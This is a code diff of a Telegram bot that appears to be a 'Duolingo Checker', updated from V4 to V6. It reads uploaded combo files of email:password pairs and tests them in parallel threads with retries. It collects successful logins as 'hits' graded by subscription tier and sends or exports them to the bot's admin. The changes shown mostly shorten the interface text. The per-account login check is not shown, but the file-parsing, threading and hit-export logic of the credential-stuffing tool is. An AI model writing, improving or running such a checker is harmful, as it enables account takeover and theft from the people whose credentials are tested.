+    btns.append(InlineKeyboardButton(f"{page+1}/{total_pages}", callback_data="noop"))
     if page < total_pages - 1:
-        buttons.append(InlineKeyboardButton("Next ▶️", callback_data=f"hits_page_{page + 1}"))
-    markup.row(*buttons)
+        btns.append(InlineKeyboardButton("▶️", callback_data=f"hits_page_{page+1}"))
+    markup.row(*btns)
     markup.row(
-        InlineKeyboardButton("📋 EXPORT ALL", callback_data="copy_all_hits"),
-        InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_hits")
+        InlineKeyboardButton("📋 EXPORT", callback_data="copy_all_hits"),
+        InlineKeyboardButton("🔄", callback_data="refresh_hits")
     )
-    markup.row(
-        InlineKeyboardButton("🏠 MAIN MENU", callback_data="main_menu")
-    )
-
-    bot.send_message(chat_id, message_text, parse_mode='Markdown', reply_markup=markup)
+    markup.row(InlineKeyboardButton("🏠 MENU", callback_data="main_menu"))
+    bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=markup)
 
 def send_stats(chat_id):
     total_hits = len(all_super_hits) + len(all_family_hits)
-    total_checked = super_count + family_count + free_count + fail_count
-    hit_rate = round(total_hits / total_checked * 100, 2) if total_checked > 0 else 0
+    total = super_count + family_count + free_count + fail_count
+    rate = round(total_hits / total * 100, 2) if total > 0 else 0
 
-    stats_text = f"""
-{'━' * 38}
-📊  𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦
-{'━' * 38}
+    msg = f"""{'━' * 32}
+📊 𝗦𝗧𝗔𝗧𝗦
+{'━' * 32}
+💎 Super: {super_count:,} ∙ 👨‍👩‍👧 Family: {family_count:,}
+⚠️ Free: {free_count:,} ∙ ❌ Fail: {fail_count:,}
+📋 Total: {total:,} ∙ 🎯 Rate: {rate}%
+{'🔴 CHECKING' if checking_active else '🟢 IDLE'}"""
 
-╭─── 🎯 𝗥𝗘𝗦𝗨𝗟𝗧𝗦 ─────────────────────╮
-│  👑  Super Premium : {super_count:,}
-│  👨‍👩‍👧  Family Plan   : {family_count:,}
-│  ⚠️  Free Accounts : {free_count:,}
-│  ❌  Failed        : {fail_count:,}
-╰────────────────────────────────────╯
-
-╭─── 📈 𝗧𝗢𝗧𝗔𝗟𝗦 ─────────────────────╮
-│  📋  Checked : {total_checked:,}
-│  🎯  Hits    : {total_hits:,}
-│  📊  Rate    : {hit_rate}%
-╰────────────────────────────────────╯
-
-╭─── ⚙️ 𝗦𝗬𝗦𝗧𝗘𝗠 ─────────────────────╮
-│  🧵  Threads  : {MAX_THREADS}
-│  🔄  Retries  : {MAX_RETRIES}x
-│  📡  Status   : {'🔴 CHECKING' if checking_active else '🟢 IDLE'}
-╰────────────────────────────────────╯
-"""
     markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("🏠 MAIN MENU", callback_data="main_menu"))
-    bot.send_message(chat_id, stats_text, parse_mode='Markdown', reply_markup=markup)
+    markup.add(InlineKeyboardButton("🏠 MENU", callback_data="main_menu"))
+    bot.send_message(chat_id, msg, parse_mode='Markdown', reply_markup=markup)
 
 # ========== CALLBACK HANDLER ==========
 @bot.callback_query_handler(func=lambda call: True)
@@ -651,19 +598,10 @@ def callback_handler(call):
         if call.data == "start_check":
             bot.answer_callback_query(call.id)
             if checking_active:
-                bot.send_message(call.message.chat.id, "⚠️ Check already running! Use /stop first.")
+                bot.send_message(call.message.chat.id, "⚠️ Already running! /stop first")
                 return
             bot.send_message(call.message.chat.id,
-                f"""
-╭─── 📎 𝗨𝗣𝗟𝗢𝗔𝗗 𝗖𝗢𝗠𝗕𝗢𝗦 ────────────────╮
-│
-│  Send your combo file (.txt)
-│  Format: email:password
-│
-│  One combo per line
-│
-╰────────────────────────────────────╯""",
-                parse_mode='Markdown')
+                "📎 Send combo file (.txt)\nFormat: `email:password`", parse_mode='Markdown')
 
         elif call.data == "my_stats":
             bot.answer_callback_query(call.id)
@@ -678,18 +616,12 @@ def callback_handler(call):
             markup = InlineKeyboardMarkup(row_width=2)
             markup.add(
                 InlineKeyboardButton("🧵 THREADS", callback_data="thread_settings"),
-                InlineKeyboardButton("🗑️ CLEAR ALL", callback_data="clear_hits")
+                InlineKeyboardButton("🔄 RETRIES", callback_data="retry_settings")
             )
-            markup.row(
-                InlineKeyboardButton("🔄 RETRY COUNT", callback_data="retry_settings")
-            )
-            markup.add(InlineKeyboardButton("🏠 MAIN MENU", callback_data="main_menu"))
-            bot.send_message(call.message.chat.id, f"""
-╭─── ⚙️ 𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦 ─────────────────────╮
-│  🧵  Threads: {MAX_THREADS}
-│  🔄  Retries: {MAX_RETRIES}x
-│  ⏱  Timeout: {REQUEST_TIMEOUT}s
-╰────────────────────────────────────╯""",
+            markup.row(InlineKeyboardButton("🗑️ CLEAR ALL", callback_data="clear_hits"))
+            markup.add(InlineKeyboardButton("🏠 MENU", callback_data="main_menu"))
+            bot.send_message(call.message.chat.id,
+                f"⚙️ 🧵{MAX_THREADS} ∙ 🔄{MAX_RETRIES}x ∙ ⏱{REQUEST_TIMEOUT}s",
                 parse_mode='Markdown', reply_markup=markup)
 
         elif call.data == "thread_settings":
@@ -701,8 +633,8 @@ def callback_handler(call):
                 InlineKeyboardButton("30", callback_data="set_threads_30"),
                 InlineKeyboardButton("50", callback_data="set_threads_50")
             )
-            markup.add(InlineKeyboardButton("⬅️ BACK", callback_data="tools"))
-            bot.send_message(call.message.chat.id, f"🧵 Current: `{MAX_THREADS}` threads\n\nSelect:", parse_mode='Markdown', reply_markup=markup)
+            markup.add(InlineKeyboardButton("⬅️", callback_data="tools"))
+            bot.send_message(call.message.chat.id, f"🧵 Current: `{MAX_THREADS}`", parse_mode='Markdown', reply_markup=markup)
 
         elif call.data == "retry_settings":
             bot.answer_callback_query(call.id)
@@ -712,13 +644,12 @@ def callback_handler(call):
                 InlineKeyboardButton("3x", callback_data="set_retry_3"),
                 InlineKeyboardButton("5x", callback_data="set_retry_5")
             )
-            markup.add(InlineKeyboardButton("⬅️ BACK", callback_data="tools"))
-            bot.send_message(call.message.chat.id, f"🔄 Current: `{MAX_RETRIES}x` retries\n\nSelect:", parse_mode='Markdown', reply_markup=markup)
+            markup.add(InlineKeyboardButton("⬅️", callback_data="tools"))
+            bot.send_message(call.message.chat.id, f"🔄 Current: `{MAX_RETRIES}x`", parse_mode='Markdown', reply_markup=markup)
 
         elif call.data.startswith("set_threads_"):
-            new_threads = int(call.data.split("_")[2])
-            MAX_THREADS = new_threads
-            bot.answer_callback_query(call.id, f"✅ Threads → {new_threads}")
+            MAX_THREADS = int(call.data.split("_")[2])
+            bot.answer_callback_query(call.id, f"✅ Threads → {MAX_THREADS}")
             send_main_menu(call.message.chat.id)
 
         elif call.data.startswith("set_retry_"):
@@ -730,11 +661,8 @@ def callback_handler(call):
             bot.answer_callback_query(call.id)
             all_super_hits.clear()
             all_family_hits.clear()
-            super_count = 0
-            family_count = 0
-            free_count = 0
-            fail_count = 0
-            bot.send_message(call.message.chat.id, "✅ All data cleared!")
+            super_count = family_count = free_count = fail_count = 0
+            bot.send_message(call.message.chat.id, "✅ Cleared!")
             send_main_menu(call.message.chat.id)
 
         elif call.data == "main_menu":
@@ -757,22 +685,20 @@ def callback_handler(call):
 
         elif call.data == "copy_all_hits":
             bot.answer_callback_query(call.id)
-            all_hits_text = f"🦉 DUOLINGO PREMIUM HITS\n{'═' * 40}\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
-
-            for email, pwd, result in all_super_hits:
-                all_hits_text += result + "\n\n"
-            for email, pwd, result in all_family_hits:
-                all_hits_text += result + "\n\n"
-
-            if all_hits_text.strip():
-                if len(all_hits_text) > 4000:
-                    parts = [all_hits_text[i:i + 4000] for i in range(0, len(all_hits_text), 4000)]
+            txt = f"🦉 HITS {datetime.now().strftime('%Y-%m-%d %H:%M')}\n{'═'*30}\n\n"
+            for e, p, r in all_super_hits:
+                txt += r + "\n\n"
+            for e, p, r in all_family_hits:
+                txt += r + "\n\n"
+            if txt.strip():
+                if len(txt) > 4000:
+                    parts = [txt[i:i+4000] for i in range(0, len(txt), 4000)]
                     for i, part in enumerate(parts):
-                        bot.send_message(call.message.chat.id, f"📋 Part {i + 1}/{len(parts)}:\n```\n{part}```", parse_mode='Markdown')
+                        bot.send_message(call.message.chat.id, f"📋 Part {i+1}/{len(parts)}:\n```\n{part}```", parse_mode='Markdown')
                 else:
-                    bot.send_message(call.message.chat.id, f"📋 All Hits:\n```\n{all_hits_text}```", parse_mode='Markdown')
+                    bot.send_message(call.message.chat.id, f"📋\n```\n{txt}```", parse_mode='Markdown')
             else:
-                bot.send_message(call.message.chat.id, "📭 No hits to export.")
+                bot.send_message(call.message.chat.id, "📭 No hits.")
 
         elif call.data.startswith("hits_page_"):
             page = int(call.data.split("_")[2])
@@ -781,7 +707,7 @@ def callback_handler(call):
     except Exception as e:
         logging.error(f"Callback error: {e}")
         try:
-            bot.answer_callback_query(call.id, "⚠️ Error occurred")
+            bot.answer_callback_query(call.id, "⚠️ Error")
         except:
             pass
 
@@ -796,35 +722,24 @@ def process_combos(chat_id, combos):
         checking_active = True
         stop_flag = False
 
-    super_count = 0
-    family_count = 0
-    free_count = 0
-    fail_count = 0
+    super_count = family_count = free_count = fail_count = 0
     all_super_hits = []
     all_family_hits = []
     all_free_accounts = []
-
-    last_batch_super = 0
-    last_batch_family = 0
-    last_batch_free = 0
-    last_batch_fail = 0
+    last_batch_super = last_batch_family = last_batch_free = last_batch_fail = 0
 
     total = len(combos)
     completed = 0
     start_time = time.time()
     last_update = 0
 
-    status_msg = bot.send_message(chat_id, f"""
-╭─── 🚀 𝗦𝗧𝗔𝗥𝗧𝗜𝗡𝗚 ─────────────────────╮
-│  📋  Combos: {total:,}
-│  🧵  Threads: {MAX_THREADS}
-│  🔄  Retries: {MAX_RETRIES}x
-╰────────────────────────────────────╯""")
+    status_msg = bot.send_message(chat_id,
+        f"🚀 Starting ∙ 📋{total:,} ∙ 🧵{MAX_THREADS} ∙ 🔄{MAX_RETRIES}x")
 
     try:
         with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
             current_executor = executor
-            futures = {executor.submit(check_single_account, email, pwd): (email, pwd) for email, pwd in combos}
+            futures = {executor.submit(check_single_account, e, p): (e, p) for e, p in combos}
             current_futures = futures
 
             for future in as_completed(futures):
@@ -834,7 +749,7 @@ def process_combos(chat_id, combos):
                     break
 
                 completed += 1
-                percent = (completed / total) * 100
+                pct = (completed / total) * 100
                 elapsed = time.time() - start_time
 
                 try:
@@ -843,7 +758,7 @@ def process_combos(chat_id, combos):
                         email, password, status, detail, plan_type = result
                     else:
                         continue
-                except Exception as e:
+                except Exception:
                     fail_count += 1
                     last_batch_fail += 1
                     continue
@@ -857,16 +772,13 @@ def process_combos(chat_id, combos):
                         super_count += 1
                         last_batch_super += 1
                         all_super_hits.append((email, password, detail))
-
                     try:
                         bot.send_message(chat_id, detail, parse_mode='Markdown')
-                    except Exception as e:
-                        logging.error(f"Failed to send hit: {e}")
+                    except:
                         try:
                             bot.send_message(chat_id, detail)
                         except:
                             pass
-
                     logging.info(f"✅ HIT: {email} ({plan_type})")
                 elif status == "FREE":
                     free_count += 1
@@ -879,68 +791,38 @@ def process_combos(chat_id, combos):
 
                 if completed - last_update >= PROGRESS_INTERVAL or completed == total:
                     last_update = completed
-                    bar_length = int(percent / 5)
-                    progress_bar = "█" * bar_length + "░" * (20 - bar_length)
-                    speed = completed / elapsed if elapsed > 0 else 0
-                    eta = (total - completed) / speed if speed > 0 else 0
+                    bar = "█" * int(pct/5) + "░" * (20 - int(pct/5))
+                    spd = completed / elapsed if elapsed > 0 else 0
+                    eta = (total - completed) / spd if spd > 0 else 0
 
-                    progress_text = f"""
-{'━' * 38}
-🦉  𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚...
-{'━' * 38}
+                    prog = f"""🦉 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚
+[{bar}] {pct:.1f}%
+📊 {completed:,}/{total:,} ∙ ⏱{elapsed:.0f}s ∙ 🚀{int(spd)}/s ∙ ETA:{int(eta)}s
 
-⏱  {elapsed:.0f}s  ┃  🚀 {int(speed)}/s  ┃  ⏳ ETA: {int(eta)}s
+💎{super_count} 👨‍👩‍👧{family_count} ⚠️{free_count} ❌{fail_count}
++{last_batch_super}💎 +{last_batch_family}👨‍👩‍👧 +{last_batch_free}⚠️ +{last_batch_fail}❌
 
-[{progress_bar}] {percent:.1f}%
-📊 {completed:,} / {total:,}
-
-╭─── 🎯 𝗛𝗜𝗧𝗦 ──────────────────────╮
-│  👑  Super  : {super_count:,}
-│  👨‍👩‍👧  Family : {family_count:,}
-│  ⚠️  Free   : {free_count:,}
-│  ❌  Fail   : {fail_count:,}
-╰────────────────────────────────────╯
-
-📈 Last {PROGRESS_INTERVAL}: 👑+{last_batch_super} 👨‍👩‍👧+{last_batch_family} ⚠️+{last_batch_free} ❌+{last_batch_fail}
-
-⚡ /stop to cancel
-"""
+⚡ /stop to cancel"""
                     try:
-                        bot.edit_message_text(progress_text, status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')
+                        bot.edit_message_text(prog, status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')
                     except:
                         pass
-
-                    last_batch_super = 0
-                    last_batch_family = 0
-                    last_batch_free = 0
-                    last_batch_fail = 0
+                    last_batch_super = last_batch_family = last_batch_free = last_batch_fail = 0
 
     except Exception as e:
         logging.error(f"Process error: {e}\n{traceback.format_exc()}")
-        bot.send_message(chat_id, f"⚠️ Error occurred: {str(e)[:100]}\nBut hits are saved!")
+        bot.send_message(chat_id, f"⚠️ Error: {str(e)[:100]}\nHits saved!")
 
     elapsed = time.time() - start_time
     total_hits = super_count + family_count
-    hit_rate = round(total_hits / total * 100, 2) if total > 0 else 0
+    rate = round(total_hits / total * 100, 2) if total > 0 else 0
 
-    final_text = f"""
-{'━' * 38}
-✅  𝗖𝗛𝗘𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗
-{'━' * 38}
-
-⏱  Time: {elapsed:.1f}s  ┃  📋 Total: {total:,}
-
-╭─── 🎯 𝗙𝗜𝗡𝗔𝗟 𝗥𝗘𝗦𝗨𝗟𝗧𝗦 ────────────────╮
-│  👑  Super  : {super_count:,}
-│  👨‍👩‍👧  Family : {family_count:,}
-│  ⚠️  Free   : {free_count:,}
-│  ❌  Fail   : {fail_count:,}
-╰────────────────────────────────────╯
-
-🎯 Hit Rate: {hit_rate}%
-💾 Click 💾 VIEW HITS to see results
-"""
-    bot.send_message(chat_id, final_text, parse_mode='Markdown')
+    bot.send_message(chat_id, f"""{'━' * 32}
+✅ 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘
+{'━' * 32}
+⏱ {elapsed:.1f}s ∙ 📋 {total:,} ∙ 🎯 {rate}%
+💎{super_count} 👨‍👩‍👧{family_count} ⚠️{free_count} ❌{fail_count}
+💾 VIEW HITS for results""", parse_mode='Markdown')
     send_main_menu(chat_id)
 
     with check_lock:
@@ -953,103 +835,84 @@ def process_combos(chat_id, combos):
 @bot.message_handler(commands=['start'])
 def start_command(message):
     if not is_admin(message.from_user.id):
-        bot.reply_to(message, "⛔ Unauthorized user.")
+        bot.reply_to(message, "⛔ Unauthorized.")
         return
     send_main_menu(message.chat.id)
 
 @bot.message_handler(commands=['stop'])
 def stop_command(message):
     global stop_flag, checking_active, current_executor, current_futures
-
     if not is_admin(message.from_user.id):
         bot.reply_to(message, "⛔ Unauthorized.")
         return
-
     if checking_active:
         stop_flag = True
         if current_futures:
-            for future in current_futures:
-                future.cancel()
-        bot.reply_to(message, "🛑 Stopping... Please wait.")
+            for f in current_futures:
+                f.cancel()
+        bot.reply_to(message, "🛑 Stopping...")
     else:
         bot.reply_to(message, "ℹ️ No active check.")
 
 @bot.message_handler(content_types=['document'])
 def handle_file(message):
     global checking_active
-
     if not is_admin(message.from_user.id):
-        bot.reply_to(message, "⛔ Unauthorized")
+        bot.reply_to(message, "⛔")
         return
-
     if checking_active:
-        bot.reply_to(message, "⚠️ Check running! Use /stop first.")
+        bot.reply_to(message, "⚠️ Running! /stop first")
         return
 
-    status_msg = bot.reply_to(message, "📥 Downloading file...")
+    status_msg = bot.reply_to(message, "📥 Loading...")
 
     try:
         file_info = bot.get_file(message.document.file_id)
-        downloaded_file = bot.download_file(file_info.file_path)
-
-        content = downloaded_file.decode('utf-8', errors='ignore')
+        content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
         combos = []
         for line in content.split('\n'):
             line = line.strip()
             if ':' in line:
                 parts = line.split(':', 1)
-                email = parts[0].strip()
-                pwd = parts[1].strip()
-                if email and pwd:
-                    combos.append((email, pwd))
+                e, p = parts[0].strip(), parts[1].strip()
+                if e and p:
+                    combos.append((e, p))
 
         if not combos:
-            bot.edit_message_text("❌ No valid combos found.\nFormat: email:password",
+            bot.edit_message_text("❌ No valid combos. Format: email:password",
                                  status_msg.chat.id, status_msg.message_id)
             return
 
-        bot.edit_message_text(f"""
-╭─── ✅ 𝗙𝗜𝗟𝗘 𝗟𝗢𝗔𝗗𝗘𝗗 ──────────────────╮
-│  📋  Combos: {len(combos):,}
-│  🧵  Threads: {MAX_THREADS}
-│  🔄  Retries: {MAX_RETRIES}x
-╰────────────────────────────────────╯
-
-🚀 Starting check...""",
-                             status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')
+        bot.edit_message_text(
+            f"✅ {len(combos):,} combos ∙ 🧵{MAX_THREADS} ∙ 🔄{MAX_RETRIES}x\n🚀 Starting...",
+            status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')
 
         thread = threading.Thread(target=process_combos, args=(message.chat.id, combos))
         thread.daemon = True
         thread.start()
 
     except Exception as e:
-        logging.error(f"File handling error: {e}")
-        bot.edit_message_text(f"❌ Error: {str(e)[:100]}", status_msg.chat.id, status_msg.message_id)
+        logging.error(f"File error: {e}")
+        bot.edit_message_text(f"❌ {str(e)[:100]}", status_msg.chat.id, status_msg.message_id)
 
-# ========== BOT START WITH AUTO-RECONNECT ==========
+# ========== BOT START ==========
 def run_bot():
-    """Run bot with auto-reconnect to prevent Railway crashes"""
     while True:
         try:
-            print("═" * 50)
-            print("🦉 DUOLINGO PREMIUM CHECKER V4")
-            print("═" * 50)
-            print(f"  👑 Admin: {ADMIN_IDS}")
-            print(f"  🧵 Threads: {MAX_THREADS}")
-            print(f"  🔄 Retries: {MAX_RETRIES}x")
-            print(f"  ⏱  Timeout: {REQUEST_TIMEOUT}s")
-            print(f"  📊 Features: Payment | Social | Family Invite | XP | Language")
-            print("═" * 50)
-            print("🟢 Bot started! Polling...")
+            print("═" * 40)
+            print("🦉 DUOLINGO CHECKER V6")
+            print(f"👑 Admin: {ADMIN_IDS}")
+            print(f"🧵 {MAX_THREADS} threads ∙ 🔄 {MAX_RETRIES}x ∙ ⏱ {REQUEST_TIMEOUT}s")
+            print("═" * 40)
+            print("🟢 Bot started!")
             bot.infinity_polling(timeout=60, long_polling_timeout=60, allowed_updates=None)
         except KeyboardInterrupt:
-            print("🛑 Bot stopped by user.")
+            print("🛑 Stopped.")
             break
         except Exception as e:
-            logging.error(f"Bot polling error: {e}")
-            logging.info("🔄 Reconnecting in 5 seconds...")
+            logging.error(f"Polling error: {e}")
+            logging.info("🔄 Reconnecting in 5s...")
             time.sleep(5)
-            continue
 
 if __name__ == "__main__":
     run_bot()
